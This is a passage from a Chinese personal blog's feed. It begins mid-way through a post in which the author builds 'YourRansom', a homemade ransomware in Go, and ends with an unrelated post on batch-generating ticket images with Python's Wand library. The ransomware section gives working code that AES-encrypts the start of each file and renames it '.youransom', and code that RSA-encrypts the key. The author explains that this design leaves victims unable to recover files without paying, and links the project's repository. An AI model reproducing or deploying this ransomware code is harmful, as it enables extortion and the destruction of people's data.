class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>嗯，这样遍历就实现完成了，接下来是加密这个重头戏。得益于 Golang 内置库的完备，我们可以直接 import 一个 <code>crypto/aes</code> 包来实现 aes 的加解密。<br>下面是 aes 加密的实现：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">encrypt</span><span class="params">(filename <span class="keyword">string</span>, cip cipher.Block)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断该文件是否已加密了</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(filename) &gt;= <span class="number">11</span> &amp;&amp; filename[<span class="built_in">len</span>(filename)<span class="number">-10</span>:] == <span class="string">".youransom"</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"Warning: A encrypted file found."</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//试图打开文件用于写入</span></span><br><span class="line">f, err := os.OpenFile(filename, os.O_RDWR, <span class="number">0</span>)</span><br><span class="line">fmt.Println(<span class="string">"Encrypt:"</span>, filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">fstat, _ := f.Stat()</span><br><span class="line">size := fstat.Size()</span><br><span class="line"></span><br><span class="line"><span class="comment">//开始循环加密</span></span><br><span class="line">buf, out := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">16</span>), <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> offset := <span class="keyword">int64</span>(<span class="number">0</span>); size-offset &gt; <span class="number">16</span> &amp;&amp; offset &lt; <span class="number">512</span>; offset += <span class="number">16</span> &#123;</span><br><span class="line">f.ReadAt(buf, offset)</span><br><span class="line">cip.Encrypt(out, buf)</span><br><span class="line">f.WriteAt(out, offset)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭文件并添加后缀</span></span><br><span class="line">f.Close()</span><br><span class="line">os.Rename(filename, filename+<span class="string">".youransom"</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>嗯，在下很贴心地添加了防止二次加密的相关判断用于保护用户的数据安全，多么贴心啊(滑稽</p><p>相信有不少兄弟在看到 aes 加密的时候都是一脸蒙蔽状态：这是啥为啥我看不明白。其实不需要在意太多，因为是全黑盒的所以只要用就好了。<br>不过基础知识还是要知道的，这里在下简单地说一下：</p><p>AES 是一种对称加密算法，通常我们可以认为在没有密钥的情况下是无法解密 AES 的。而所谓对称加密，可以理解为像通常我们理解的加解密那样，用同一个密钥既能加密，也能解密。<br>这背后是有比较复杂的数学原理的，喜欢探究而且高数成绩不错的同学可以试试去 wiki 的 aes 页面看一眼。</p><p>毫无疑问 AES 的性能是很高的，而通常我们看到的勒索却大都写着使用 RSA 加密，这是一个显而易见的原因的，就是 AES 是对称加密。<br>我们很难去简单的使用对称加密实现一个 “用户被加密之后不管怎么搞都解不了密只能乖乖交钱” 的场景，无论是发送到服务器，还是保存到本地，都是很危险的。<br>还记得曾经有一个国产加密使用 AES 还直接把密钥存到本地最后没收到钱还被嘲讽了一番的悲伤故事么？</p><p>而这种场景交由 rsa 实现简直不能再棒了：<br>RSA 是一种非对称加密，它有两个密钥：用其中一个密钥加密的数据只有用另一个密钥才能解密。这就完美地消除了将密钥存储在本地的危险。</p><p>下面是在下使用 rsa 加密 aes 密钥的实现：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">saveKey</span><span class="params">(cip []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line">keyFile, _ := os.Create(<span class="string">"YourRansom.key"</span>)</span><br><span class="line">block, _ := pem.Decode(pubKey)</span><br><span class="line">pubI, _ := x509.ParsePKIXPublicKey(block.Bytes)</span><br><span class="line">pub := pubI.(*rsa.PublicKey)</span><br><span class="line">word, _ := rsa.EncryptPKCS1v15(rand.Reader, pub, cip)</span><br><span class="line">keyFile.WriteAt(word, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后把它们拼在一起，就成为了 YourRansom，一个简单至极的自制勒索。</p><p>Github：<a href="https://github.com/popu125/YourRansom" target="_blank" rel="noopener">https://github.com/popu125/YourRansom</a></p><p>17/01/17</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;嘛自从去年 10 月更过博客之后就啥都没写过了。。。这次正好趁着卫队搞新年活动写点什么。&lt;/p&gt;
&lt;p&gt;前段时间在卡饭，勒索病毒是很火的一个讨论话题，而我也跟着一位大神的风写了一个简单的勒索病毒，这里写一点东西，作为纪念。&lt;/p&gt;
&lt;p&gt;说起勒索病毒，其实它的行为和技术都很
      
    
    </summary>
    
      <category term="手记" scheme="https://bobo.moe/categories/%E6%89%8B%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>记一次对于 Py 图像库的蛋疼应用</title>
    <link href="https://bobo.moe/post/py-pic/"/>
    <id>https://bobo.moe/post/py-pic/</id>
    <published>2016-05-10T16:00:00.000Z</published>
    <updated>2018-02-20T12:22:42.173Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>想帮同学批量生成个门票图片，便于打印（他们竟然在用 Acrobat 编辑 pdf 然后打印，当然去年他们竟然用 PS 编辑，相对来讲倒是好多了。。。）</p><h2 id="折腾路上-预处理"><a href="#折腾路上-预处理" class="headerlink" title="折腾路上 - 预处理"></a>折腾路上 - 预处理</h2><p>我第一反应当然是用 Py 来做这种东西，毕竟轮子比较多。</p><p>票务上的同学给了我一个坑爹的 xls，数据格式类似（括号内为栗子）：<code>座区（QWQ）| 票号（2333）| 座位信息（QWQ/01/01）</code>。<br>果断上 Navicat 大法导入一个 sqlite 文件，提取的时候直接用 SQL 语句即可。</p><h2 id="大坑一-图像处理"><a href="#大坑一-图像处理" class="headerlink" title="大坑一 - 图像处理"></a>大坑一 - 图像处理</h2><p>然后就是图像库这一最重要轮子的问题了，我所知的 py 图像库有 PIL（Pillow）和 Wand，看不少人都挺推崇 PIL 的，果断上之，而且 <a href="http://pillow.readthedocs.io/en/latest/" target="_blank" rel="noopener">Pillow 的文档</a> 也相当的全，是一个品质之选。</p><p>但是我最后还是选择了 Wand，这是因为在一篇文章中看到有人说似乎 Pillow 的 font_size 无法正常使用。我在开发的时候用 pdf 中的字号填了上去，发现字很小，于是听信之。（事实证明并没有这回事</p><p>然而在换成 Wand 之后，用同样的字号值依旧如此，，，坑了</p><p>附：测试时所用代码<br>Pillow（参考自<a href="http://pillow.readthedocs.io/en/latest/reference/ImageDraw.html" target="_blank" rel="noopener">Pillow 的 doc</a>）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image, ImageDraw</span><br><span class="line"></span><br><span class="line">base = Image.open(&apos;4.jpg&apos;)</span><br><span class="line">txt = Image.new(&apos;RGBA&apos;, base.size, (255,255,255,0))</span><br><span class="line">fnt = ImageFont.truetype(&apos;./Calibri_Light.ttf&apos;, 48.0)</span><br><span class="line">d = ImageDraw.Draw(txt)</span><br><span class="line"></span><br><span class="line">d.text((10,10), &apos;WTF&apos;, font=fnt, fill=(255,255,255,255))</span><br><span class="line"></span><br><span class="line">out = Image.alpha_composite(base, txt)</span><br><span class="line">out.show()</span><br></pre></td></tr></table></figure></p><p>Wand（参考<a href="http://docs.wand-py.org/en/0.4.2/guide/drawing.html" target="_blank" rel="noopener">Wand 的 doc-Drawing</a>）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from wand.image import Image</span><br><span class="line">from wand.display import display</span><br><span class="line">from wand.drawing import Drawing</span><br><span class="line">from wand.color import Color</span><br><span class="line">from wand.font import Font</span><br><span class="line"></span><br><span class="line">img = Image(filename=&apos;4.jpg&apos;)</span><br><span class="line">with Drawing() as draw:</span><br><span class="line">draw.font = &apos;./Calibri_Light.ttf&apos;</span><br><span class="line">draw.font_size = 48.0</span><br><span class="line">draw.fill_color = Color(&apos;White&apos;)</span><br><span class="line">draw.text(10, 10, &apos;WTF&apos;)</span><br><span class="line">draw(img)</span><br><span class="line">img.save(&apos;text.jpg&apos;)</span><br></pre></td></tr></table></figure></p><p>后来啊，我发现。。。调大字号字确实能变大，只不过从 pdf 中找出来的字号大小不合用。。。（喷水. jpg</p><p>而且因为已经把基于 PIL 的代码重写成了基于 Wand 的代码，干脆就这样用下去吧。</p><h2 id="大坑二-Acrobat-导出图片分辨率"><a href="#大坑二-Acrobat-导出图片分辨率" class="headerlink" title="大坑二 - Acrobat 导出图片分辨率"></a>大坑二 - Acrobat 导出图片分辨率</h2><p>本来在用一张测试的时候一切都好好地，但当我开始试图用多张模板进行工作时（他们给了我五个版），坑就来了。每一张图上的字竟然不一样大，而且字所在位置也不同。仔细查看之，发现各图分辨率也是不同，心有所感，打开 Acrobat，细细检查导出选项，赫然见一“分辨率：自动选择”（这 tm 坑爹呢）</p><p>于是挨张重新生成之。</p><h2 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h2><p>坑已填好了，bobo 就用实际代码说话了：</p><p>模块（tkimg.py）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from wand.image import Image</span><br><span class="line">from wand.display import display</span><br><span class="line">from wand.drawing import Drawing</span><br><span class="line">from wand.color import Color</span><br><span class="line">from wand.font import Font</span><br><span class="line"></span><br><span class="line">def maketk(picname, areainfo, face):</span><br><span class="line">    img = Image(filename=picname)</span><br><span class="line"></span><br><span class="line">    if face == &apos;front&apos;:</span><br><span class="line">        for i in (0,1,2):</span><br><span class="line">            plus = i * 2350</span><br><span class="line">            with Drawing() as draw:</span><br><span class="line">                draw.font = &apos;./Calibri_Light.ttf&apos;</span><br><span class="line">                draw.font_size = 288.0</span><br><span class="line">                draw.fill_color = Color(&apos;White&apos;)</span><br><span class="line">                draw.text(160, 2115+plus, areainfo[i][0])</span><br><span class="line">                draw.text(1859, 2115+plus, areainfo[i][1])</span><br><span class="line">                draw.text(2698, 2115+plus, areainfo[i][2])</span><br><span class="line">                draw.text(3518, 2115+plus, areainfo[i][3])</span><br><span class="line">                draw.draw(img)</span><br><span class="line">    elif face == &apos;back&apos;:</span><br><span class="line">        for i in (0,1,2):</span><br><span class="line">            plus = i * 2350</span><br><span class="line">            with Drawing() as draw:</span><br><span class="line">                draw.font = &apos;./Calibri_Light.ttf&apos;</span><br><span class="line">                draw.font_size = 160.0</span><br><span class="line">                draw.fill_color = Color(&apos;White&apos;)</span><br><span class="line">                draw.text(4349, 2180+plus, areainfo[i][4])</span><br><span class="line">                draw.draw(img)</span><br><span class="line"></span><br><span class="line">    imgname = &quot;%s-%s%s%s-%s%s%s.jpg&quot; % (face, areainfo[0][0], areainfo[0][2], areainfo[0][3], areainfo[2][0], areainfo[2][2], areainfo[2][3])</span><br><span class="line">    img.save(filename=imgname)</span><br></pre></td></tr></table></figure><p>数据处理（app.py）：<br>太懒略之，回头有空再翻出来补。</p><p>May 11, 2016</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;想帮同学批量生成个门票图片，便于打印（他们竟然在用 Acrobat 编辑 pdf 然后打印，当然去年他们竟然用 PS 编辑，相对来讲倒是好多
      
    
    </summary>
    
      <category term="手记" scheme="https://bobo.moe/categories/%E6%89%8B%E8%AE%B0/"/>
    
    
  </entry>
  
</feed>
